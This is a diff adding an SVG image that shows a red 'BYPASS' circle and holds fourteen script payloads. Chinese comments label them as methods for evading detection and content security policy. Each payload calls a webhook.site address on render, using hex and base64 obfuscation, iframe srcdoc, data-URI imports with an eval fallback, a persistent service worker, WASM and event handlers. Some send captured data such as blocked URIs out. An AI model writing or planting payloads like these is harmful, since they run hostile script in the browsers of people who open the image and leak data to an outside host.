@@ -1,0 +1,141 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100" viewBox="0 0 100 100">
+  <!-- 正常外观 -->
+  <circle cx="50" cy="50" r="40" fill="#ff6b6b"/>
+  <text x="50" y="55" text-anchor="middle" fill="white" font-size="10">BYPASS</text>
+  
+  <!-- 方法1: Payload Splitting - 分割载荷绕过检测 -->
+  <defs>
+    <script id="part1">var a='ht';</script>
+    <script id="part2">var b='tps:';</script>
+    <script id="part3">var c='//web';</script>
+    <script id="part4">var d='hook.site/';</script>
+    <script id="part5">var e='d05a92d2-27d4-47e0-a988-eae785a23829';</script>
+  </defs>
+  
+  <!-- 方法2: Unicode编码混淆 -->
+  <script>
+    <![CDATA[
+      // Unicode编码的fetch
+      var \u0066\u0065\u0074\u0063\u0068 = window['\u0066\u0065\u0074\u0063\u0068'];
+      // 十六进制编码的URL
+      var url = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x2e\x73\x69\x74\x65\x2f\x64\x30\x35\x61\x39\x32\x64\x32\x2d\x32\x37\x64\x34\x2d\x34\x37\x65\x30\x2d\x61\x39\x38\x38\x2d\x65\x61\x65\x37\x38\x35\x61\x32\x33\x38\x32\x39';
+    ]]>
+  </script>
+  
+  <!-- 方法3: 基于CSP违规事件的绕过 -->
+  <script>
+    <![CDATA[
+      document.addEventListener('securitypolicyviolation', function(e) {
+        // 利用CSP违规事件触发
+        var img = new Image();
+        img.src = 'https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?csp_violation=1&blocked=' + encodeURIComponent(e.blockedURI);
+      });
+    ]]>
+  </script>
+  
+  <!-- 方法4: 利用iframe srcdoc绕过 -->
+  <foreignObject x="0" y="0" width="1" height="1">
+    <iframe xmlns="http://www.w3.org/1999/xhtml" 
+            srcdoc="&lt;script&gt;parent.postMessage('iframe_bypass','*');&lt;/script&gt;&lt;img src=x onerror='fetch(`https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?iframe_srcdoc=1`)'&gt;"
+            style="display:none"></iframe>
+  </foreignObject>
+  
+  <!-- 方法5: 利用data URI和base64编码 -->
+  <image xlink:href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlL2QwNWE5MmQyLTI3ZDQtNDdlMC1hOTg4LWVhZTc4NWEyMzgyOT9kYXRhX3VyaT0xJyk8L3NjcmlwdD48L3N2Zz4="/>
+  
+  <!-- 方法6: 利用CSS表达式和calc()函数 -->
+  <style>
+    <![CDATA[
+      .bypass {
+        background: url('https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?css_calc=1');
+        width: calc(1px + 0px);
+        height: expression(fetch('https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?css_expression=1'));
+      }
+    ]]>
+  </style>
+  <rect class="bypass" x="0" y="0" width="1" height="1" opacity="0"/>
+  
+  <!-- 方法7: 利用SVG的use元素和fragment identifier -->
+  <use xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3Cscript%3Efetch('https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?use_fragment=1')%3C/script%3E%3C/svg%3E#icon"/>
+  
+  <!-- 方法8: 利用Web Workers绕过主线程限制 -->
+  <script>
+    <![CDATA[
+      try {
+        var workerCode = `
+          self.onmessage = function(e) {
+            fetch('https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?worker=1&data=' + e.data);
+          };
+        `;
+        var blob = new Blob([workerCode], {type: 'application/javascript'});
+        var worker = new Worker(URL.createObjectURL(blob));
+        worker.postMessage('worker_bypass_test');
+      } catch(e) {
+        // Worker失败时的备用方案
+        (new Image()).src = 'https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?worker_fail=1';
+      }
+    ]]>
+  </script>
+  
+  <!-- 方法9: 利用Service Worker进行持久化攻击 -->
+  <script>
+    <![CDATA[
+      if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('data:application/javascript,self.addEventListener("fetch",e=>fetch("https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?sw=1"))')
+        .then(() => (new Image()).src = 'https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?sw_registered=1')
+        .catch(() => (new Image()).src = 'https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?sw_fail=1');
+      }
+    ]]>
+  </script>
+  
+  <!-- 方法10: 利用WebAssembly绕过JavaScript限制 -->
+  <script>
+    <![CDATA[
+      try {
+        // 简单的WASM模块，用于绕过JS检测
+        var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,7,7,1,3,114,117,110,0,0,10,4,1,2,0,11]);
+        WebAssembly.instantiate(wasmCode).then(module => {
+          fetch('https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?wasm=1');
+        });
+      } catch(e) {
+        (new Image()).src = 'https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?wasm_fail=1';
+      }
+    ]]>
+  </script>
+  
+  <!-- 方法11: 利用动态import()绕过静态分析 -->
+  <script>
+    <![CDATA[
+      // 动态构造模块URL
+      var moduleUrl = 'data:text/javascript,fetch("https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?dynamic_import=1")';
+      import(moduleUrl).catch(() => {
+        // import失败时的备用方案
+        eval('fetch("https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?eval_fallback=1")');
+      });
+    ]]>
+  </script>
+  
+  <!-- 方法12: 利用Mutation Observer监听DOM变化 -->
+  <script>
+    <![CDATA[
+      var observer = new MutationObserver(function(mutations) {
+        fetch('https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?mutation=1&changes=' + mutations.length);
+      });
+      observer.observe(document.body, {childList: true, subtree: true});
+    ]]>
+  </script>
+  
+  <!-- 方法13: 利用Intersection Observer API -->
+  <script>
+    <![CDATA[
+      var intersectionObserver = new IntersectionObserver(function(entries) {
+        fetch('https://webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829?intersection=1');
+      });
+      intersectionObserver.observe(document.body);
+    ]]>
+  </script>
+  
+  <!-- 方法14: 最终的多重编码备用方案 -->
+  <animateTransform attributeName="transform" type="scale" values="1;1" dur="0.1s"
+    onbegin="setTimeout(function(){var%20u%3D%27https%3A//webhook.site/d05a92d2-27d4-47e0-a988-eae785a23829%3Ffinal%3D1%27%3Bfetch%28u%29.catch%28%28%29%3D%3E%28new%20Image%28%29%29.src%3Du%29%3B}%2C2000)"/>
+</svg>
